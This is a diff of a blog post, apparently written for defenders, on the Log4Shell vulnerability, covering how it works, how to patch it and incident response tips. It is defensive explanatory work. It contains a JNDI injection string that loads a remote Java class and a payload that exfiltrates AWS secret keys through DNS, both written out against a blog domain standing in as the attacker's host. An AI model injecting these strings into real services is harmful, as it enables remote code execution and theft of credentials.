@@ -27,7 +27,7 @@ Log4j is an open-source component, which is widely used in different application
 
 {{< twitter user="chvancooten" id="1469340927923826691" >}}
 
-All admins and information security professionals have been busy for the past week but I can't even imagine how the week has been in the Log4j developer community. My warmest thoughts to you folks! I hope that this vulnerability reminds companies who use open-source code in their commercial products that they should also support these open-source projects financially. 
+All admins and information security professionals have been busy for the past week, but I can't even imagine how the week has been in the Log4j developer community. My warmest thoughts to you folks! I hope that this vulnerability reminds companies who use open-source code in their commercial products that they should also support these open-source projects financially. 
 
 ## How to know if this affects me?
 
@@ -35,7 +35,9 @@ As a user, there's no easy way to find it out. In this case it's best to trust y
 
 As an organization, try to find Log4j installations from your infra. And check this [list by NCSC-NL](https://github.com/NCSC-NL/log4shell/tree/main/software) to check status of the products you use!
 
-As a side note, many forensics and blue team tools have been identified or rumored to be vulnerable. These tools include Carbon Black, Splunk, IBM Qradar, Autopsy, and Cellebrite. Imagine investigating evidence that contains the exploitation code and your forensic environment allows malicious actor in. This is good reminder why you should always do forensics without and internet access.
+As a side note, many forensics and blue team tools have been identified or rumored to be vulnerable. These tools include Carbon Black, ~~Splunk, IBM Qradar~~ [1], Autopsy, and Cellebrite. Imagine investigating evidence that contains the exploitation code and your forensic environment allows malicious actor in. This is good reminder why you should always do forensics without and internet access.
+
+[1] These products are not vulnerable to Log4Shell. However, Qradar has vulnerable plugins and Splunk has vulnerable connectors.
 
 ## The vulnerability
 
@@ -43,17 +45,17 @@ The vulnerability is consequence of three different features or vulnerabilities 
 
 1. Root cause of the vulnerability is lack of improper input validation (CWE-20). Basically user can input any string to the application and if the application is set to log for example requested URIs, the URI will end up to Log4j logger without any sanitation.
 
-2. The Log4j happens to have lookup feature (yes, it's a feature introduced in version log4j-2.0-beta9), which allows requesting variables from the system running the Log4j component. This feature can be called from Log4j using `${variable_here}` You can request for example username on a Linux system by providing string `${env:USER}` to Log4j and it will log the username from environment variable user and the value is the running the application.
+2. The Log4j happens to have lookup feature (yes, it's a feature introduced in version log4j-2.0-beta9), which allows requesting variables from the system running the Log4j component. This feature can be called from Log4j using `${variable_here}` You can request for example username on a Linux system by providing string `${env:USER}` to Log4j, and it will log the username from environment variable user and the value is the running the application.
 
-3. Now we get to the interesting part... :D Java runtime has a [Java Naming and Directory Interface (JNDI)](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface) which can be used to discover and look up data from remote endpoints. This feature can be called from Log4j by using the lookup method and adding `jndi` string to the lookup command: `${jndi:method:remoteaddress}`. JNDI allows multiple methods for the look up: LDAP, DNS, NIS, NDS, RMI, and CORBA, which means we can use any of these methods to look up more data from a remote endpoint. Oh, and the best thing is that JNDI is not a new attack vector, it was [introduced in BHUSA 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf).
+3. Now we get to the interesting part... :D Java runtime has a [Java Naming and Directory Interface (JNDI)](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface) which can be used to discover and look up data from remote endpoints. This feature can be called from Log4j by using the lookup method and adding `jndi` string to the lookup command: `${jndi:method:remoteaddress}`. JNDI allows multiple methods for the look-up: LDAP, DNS, NIS, NDS, RMI, and CORBA, which means we can use any of these methods to look up more data from a remote endpoint. Oh, and the best thing is that JNDI is not a new attack vector, it was [introduced in BHUSA 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf).
 
-If we would host our malicious Java class in `example.dfir.fi:4444/legit`, our exploitation string would be `${jndi:ldap:example.dfir.fi:4444/legit}`. Inputting this string to vulnerable application would cause the server to look up and execute our Java class hosted on our server.
+If we hosted our malicious Java class in `example.dfir.fi:4444/legit`, our exploitation string would be `${jndi:ldap:example.dfir.fi:4444/legit}`. Inputting this string to vulnerable application would cause the server to look up and execute our Java class hosted on our server.
 
 If you are more interested how the vulnerability works, I suggest you to read [this write-up by Paul Ducklin](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/) of Sophos.
 
 ## Version confusion and fixing the vulnerability
 
-First of all, I've seen a lot arguments that "we are not vulnerable as we use Log4j 1.X". This is true *when we talk about Log4shell* as Log4j 1.X is not vulnerable to this issue. Log4j 1.X however has many other issues, like CVE-2019-178571 in versions 1.2.X. CVE-2019-17571 has also [public PoC](https://0xsapra.github.io/website/CVE-2019-17571).
+First of all, I've seen a lot of arguments that "we are not vulnerable as we use Log4j 1.X". This is true *when we talk about Log4shell* as Log4j 1.X is not vulnerable to this issue. Log4j 1.X however has many other issues, like CVE-2019-178571 in versions 1.2.X. CVE-2019-17571 has also [public PoC](https://0xsapra.github.io/website/CVE-2019-17571).
 
 {{< twitter user="GossiTheDog" id="1469250605826850819" >}}
 
@@ -71,15 +73,17 @@ Today, on 18th of December, Apache released Log4j version 2.17.0. Based on the r
 
 ![U in hurry?](/assets/images/log4j-2.17.0.png)
 
-The best solution to fix Log4shell, is to update Log4j version to newest available, which was at the time of writing version 2.17.0. Based on the public information available at the moment, the first RCE safe version would be 2.16.0 at the moment.
+The best solution to fix Log4shell, is to update Log4j version to the newest available, which was at the time of writing version 2.17.0. Based on the public information available at the moment, the first RCE safe version would be 2.16.0 at the moment.
 
-The issue can also be contained by using default deny outbound, e.q. restricting outbound connections from the server (egress rules). The egress rules contain RCE but the attack vector can still be used for data exfiltration, if the server can resolve domain names. For example if AWS secret keys are stored as an environment variable, it can be used as a subdomain and if an attacker has access to the name server of the used domain, they can see the query. This kind of attack could be achieved by injecting following string to vulnerable services:
+The issue can also be contained by using default deny outbound, e.q. restricting outbound connections from the server (egress rules). The egress rules contain RCE, but the attack vector can still be used for data exfiltration, if the server can resolve domain names. For example if AWS secret keys are stored as an environment variable, it can be used as a subdomain and if an attacker has access to the name server of the used domain, they can see the query. This kind of attack could be achieved by injecting following string to vulnerable services:
 
 ```
 ${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.dfir.fi/log4j}
 ```
 
-Succesful mitigation of the vulnerability can be achieved by removing the vulnerable `JndiLookup` class from Log4j:
+There are also rumors of payloads that work without downloading anything from internet. I will update this blog post, if I come across with working one.
+
+Successful mitigation of the vulnerability can be achieved by removing the vulnerable `JndiLookup` class from Log4j:
 
 ```
 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
@@ -87,7 +91,7 @@ zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
 
 ## Incident response tips
 
-The vulnerability was reported to Apache in November 2021 but it has been in Log4j since version 2.0-beta9, which was released 8 years ago. The vulnerability was released on 10th of December and since then the scanning has been super wild. Cloudflare also claims that they have seen the first exploit attempts on 1st of December 2021. Taking these premises into account, we should assume our vulnerable internet facing services have been breached.
+The vulnerability was reported to Apache in November 2021, but it has been in Log4j since version 2.0-beta9, which was released 8 years ago. The vulnerability was released on 10th of December and since then the scanning has been super wild. Cloudflare also claims that they have seen the first exploit attempts on 1st of December 2021. Taking these premises into account, we should assume our vulnerable internet facing services have been breached.
 
 {{< twitter user="eastdakota" id="1469800951351427073" >}}
 
@@ -97,10 +101,10 @@ To start the investigation, you should take a look to logs. Look for any signs o
 
 [Florian Roth has also released a nice scanner](https://github.com/Neo23x0/log4shell-detector) for Log4shell exploitation attempts. If you find exploitation attempts from access logs, please note that the HTTP code does not indicate if the exploitation was successful or not. The Log4j might log the requests whether the requested URI exists or not. It's also good to remind that you might not have all HTTP headers and POST payload stored anywhere, which makes detecting the issue and investigating the incident much harder. Thankfully all incident responders have already used to lack of visibility.
 
-After locating the exploitation, you should examine what it does and where it tries to fetch the payload. When you know where the payload is downloaded from, check the firewall logs if you can confirm if the download was successfully. Next see where the payload is written. I know there has been a lot Mushtik and Kinsing distributed using the Log4shell. Both of them use cron for persistence so you should check cronjobs running on the system. I wouldn't consider these payloads as severe threat for organization but I would be worried if there was anything else than these or a coin miner.
+After locating the exploitation, you should examine what it does and where it tries to fetch the payload. When you know where the payload is downloaded from, check the firewall logs if you can confirm if the download was successfully. Next see where the payload is written. I know there has been a lot Mushtik and Kinsing distributed using the Log4shell. Both of them use cron for persistence, so you should check cronjobs running on the system. I wouldn't consider these payloads as severe threat for organization but I would be worried if there was anything else than these or a coin miner.
 
 Based on the [AdvIntel blog post](https://www.advintel.io/post/ransomware-advisory-log4shell-exploitation-for-initial-access-lateral-movement), Conti ransomware also uses Log4shell for initial access and lateral movement. My bet is that in few weeks we see a bloom in ransomware cases that used Log4shell for the initial access. I am also certain that all logs regarding Log4j are not available to you in your SIEM. If you haven't started yet, now would be great time to start threat hunting and use successful Log4shell exploitation as your hypothesis.
 
 ## Disclaimer
 
-I did not go deep into the different Java versions. Some of the vulnerabilities and fixes require correct version Java. Also please note that these are my personal memos of the issue. Please also note that I've zero experience in developing Java and this blog post is written based on the information publicly available on 18th of December 2021.
+I did not go deep into the different Java versions. Some vulnerabilities and fixes require correct version Java. Also, please note that these are my personal memos of the issue. Please also note that I've zero experience in developing Java and this blog post is written based on the information publicly available on 18th of December 2021.
